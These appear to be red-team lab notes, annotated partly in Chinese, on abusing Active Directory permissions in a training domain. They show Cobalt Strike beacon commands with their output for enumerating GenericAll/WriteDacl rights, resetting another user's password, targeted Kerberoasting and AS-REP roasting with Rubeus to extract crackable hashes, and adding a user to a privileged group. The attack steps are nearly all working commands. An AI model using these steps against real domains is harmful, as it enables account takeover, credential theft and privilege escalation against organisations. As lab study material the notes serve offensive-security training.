# Discretionary Access Control Lists

ACL(Access Control Lists,自由控制列表)

下面命令返回对jadams具有GenericAll、WriteProperty或WriteDacl的主体

```
beacon> powershell Get-DomainObjectAcl -Identity jadams | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select SecurityIdentifier, ActiveDirectoryRights | fl

SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125
ActiveDirectoryRights : GenericAll

SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125
ActiveDirectoryRights : GenericAll

beacon> powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125
DEV\1st Line Support
```


列举ACL对那些OU有GenericAll权限
```
beacon> powershell Get-DomainObjectAcl -SearchBase "CN=Users,DC=dev,DC=cyberbotic,DC=io" | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

ObjectDN              : CN=Joyce Adam,CN=Users,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : GenericAll
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN              : CN=1st Line Support,CN=Users,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : GenericAll
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN              : CN=Developers,CN=Users,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : GenericAll
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN              : CN=Oracle Admins,CN=Users,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : GenericAll
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125
```

BloodHound查询上面的内容
```
MATCH (g1:Group), (g2:Group), p=((g1)-[:GenericAll]->(g2)) RETURN p
```

缩小查询范围
```
MATCH (g1:Group {name:"1ST LINE SUPPORT@DEV.CYBERBOTIC.IO"}), (g2:Group), p=((g1)-[:GenericAll]->(g2)) RETURN p
```


# Reset User Password

重置用户密码

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> make_token DEV\jking Purpl3Drag0n
[+] Impersonated DEV\bfarmer

beacon> run net user jadams N3wPassw0rd! /domain

The request will be processed at a domain controller for domain dev.cyberbotic.io.

The command completed successfully.
```

# Targeted Kerberoasting

我们可以在帐户上设置一个 SPN，对其进行 kerberoast 并尝试离线破解，而不是更改密码。

```
beacon> powershell Set-DomainObject -Identity jadams -Set @{serviceprincipalname="fake/NOTHING"}
beacon> powershell Get-DomainUser -Identity jadams -Properties ServicePrincipalName

serviceprincipalname
--------------------
fake/NOTHING

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /user:jadams /nowrap

[*] Action: Kerberoasting

[*] Target User            : jadams
[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 1

[*] SamAccountName         : jadams
[*] DistinguishedName      : CN=Joyce Adam,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] ServicePrincipalName   : fake/NOTHING
[*] PwdLastSet             : 3/10/2021 3:28:20 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT

[*] Hash                   : $krb5tgs$23$*jadams$dev.cyberbotic.io$fake/NOTHING*$7D84D4D25DD82A170B308A21FED2E1F5$B22A1E [...snip...] 56B2E7

beacon> powershell Set-DomainObject -Identity jadams -Clear ServicePrincipalName
```

# Targeted ASREPRoasting

与上面的思路类似。修改帐户上的用户帐户控制值以禁用预身份验证，然后 ASREProast 它

```
beacon> powershell Get-DomainUser -Identity jadams | ConvertFrom-UACValue

Name                           Value                                                     
----                           -----                                                     NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

beacon> powershell Set-DomainObject -Identity jadams -XOR @{UserAccountControl=4194304}
beacon> powershell Get-DomainUser -Identity jadams | ConvertFrom-UACValue

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512                              
DONT_EXPIRE_PASSWORD           65536                              
DONT_REQ_PREAUTH               4194304

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asreproast /user:jadams /nowrap

[*] Action: AS-REP roasting

[*] Target User            : jadams
[*] Target Domain          : dev.cyberbotic.io

[*] Searching path 'LDAP://dc-2.dev.cyberbotic.io/DC=dev,DC=cyberbotic,DC=io' for AS-REP roastable users

[*] SamAccountName         : jadams
[*] DistinguishedName      : CN=Joyce Adams,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Building AS-REQ (w/o preauth) for: 'dev.cyberbotic.io\jadams'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$jadams@dev.cyberbotic.io:5E0549 [...snip...] 131FDC

beacon> powershell Set-DomainObject -Identity jadams -XOR @{UserAccountControl=4194304}
beacon> powershell Get-DomainUser -Identity jadams | ConvertFrom-UACValue

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536
```

# Modify Domain Group Membership

如果我们对域里的某个组上有 ACL，我们可以添加和删除组成员
```
beacon> run net group "Oracle Admins" bfarmer /add /domain

The request will be processed at a domain controller for domain dev.cyberbotic.io.

The command completed successfully.

beacon> run net user bfarmer /domain

The request will be processed at a domain controller for domain dev.cyberbotic.io.

User name                    bfarmer
Full Name                    Bob Farmer

[...snip...]

Global Group memberships     *Domain Users         *Roaming Users        
                             *Developers           *Oracle Admins
```